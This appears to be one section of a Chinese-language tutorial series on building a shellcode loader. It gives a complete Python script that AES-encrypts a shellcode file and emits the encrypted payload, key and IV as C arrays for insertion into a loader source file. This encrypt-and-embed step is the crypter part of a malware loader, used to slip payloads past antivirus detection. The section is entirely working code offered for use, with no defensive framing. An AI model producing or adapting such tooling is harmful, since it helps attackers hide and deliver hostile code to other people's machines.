## Part 3 — payload 加密工具 `enc.py`

```python
# enc.py — 把本机样本 shellcode 打包成 loader 需要的 C 数组
# 用法: python enc.py sample.bin
import sys, os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

key = os.urandom(32)
iv  = os.urandom(16)

data = open(sys.argv[1], "rb").read()
pad = 16 - len(data) % 16
data += bytes([pad]) * pad

cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
enc = cipher.encryptor().update(data) + cipher.encryptor().finalize()

def c_array(name, b):
    body = ", ".join(f"0x{x:02x}" for x in b)
    return f"static const unsigned char {name}[{len(b)}] = {{ {body} }};"

print(c_array("enc_payload", enc))
print(c_array("aes_key", key))
print(c_array("aes_iv", iv))
print("/* 把上面三段替换进 loader.c */")
